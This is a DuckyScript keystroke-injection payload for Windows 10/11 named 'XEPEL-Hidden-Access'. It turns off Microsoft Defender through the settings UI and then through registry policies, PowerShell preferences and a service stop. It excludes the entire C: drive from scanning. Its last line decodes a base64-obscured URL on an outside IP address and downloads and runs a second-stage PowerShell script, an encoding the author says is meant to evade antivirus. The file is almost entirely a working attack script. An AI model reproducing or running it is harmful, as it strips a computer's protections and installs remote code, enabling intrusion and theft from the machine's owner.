REM Title: XEPEL-Hidden-Access
REM Author: XEPEL
REM Description: Disables Defender via UI + registry + encoded IEX pull
REM Target: Windows 10/11

REM ── Step 1: Open Windows Security ──
GUI
DELAY 500
STRING windows security
DELAY 500
ENTER
DELAY 2000

REM ── Step 2: Virus and Threat Protection ──
ENTER
DELAY 1000

REM ── Step 3: Manage Settings ──
TAB
TAB
TAB
TAB
TAB
DELAY 300
ENTER
DELAY 1500

REM ── Step 4: Force page to top ──
CTRL HOME
DELAY 300

REM ── Step 5: TAB once to land on Real Time Protection toggle ──
DELAY 500

REM ── Step 6: Toggle off ──
SPACE
DELAY 800

REM ── Step 7: UAC Yes ──
LEFT
ENTER
DELAY 2000

REM ── Step 8: Close Windows Security ──
ALT F4
DELAY 800

REM ── Step 9: Open PowerShell as admin ──
GUI r
DELAY 800
STRING powershell
DELAY 300
CTRL SHIFT ENTER
DELAY 2000

REM ── Step 10: UAC Yes for PowerShell ──
LEFT
ENTER
DELAY 2000

REM ── Step 11: Disable Defender via registry ──
STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
DELAY 500
STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
DELAY 500
STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
DELAY 500
STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
DELAY 500

REM ── Step 12: Kill Defender services ──
STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
DELAY 500
STRINGLN Stop-Service WinDefend -Force
DELAY 500

REM ── Step 13: Add full drive exclusion ──
STRINGLN Add-MpPreference -ExclusionPath 'C:\'
DELAY 500

REM ── Step 14: Pull stage2.ps1 encoded to bypass AV string detection ──
STRINGLN powershell -c "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE1My43NS44Mi4xOTgvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString($u)"
DELAY 1000
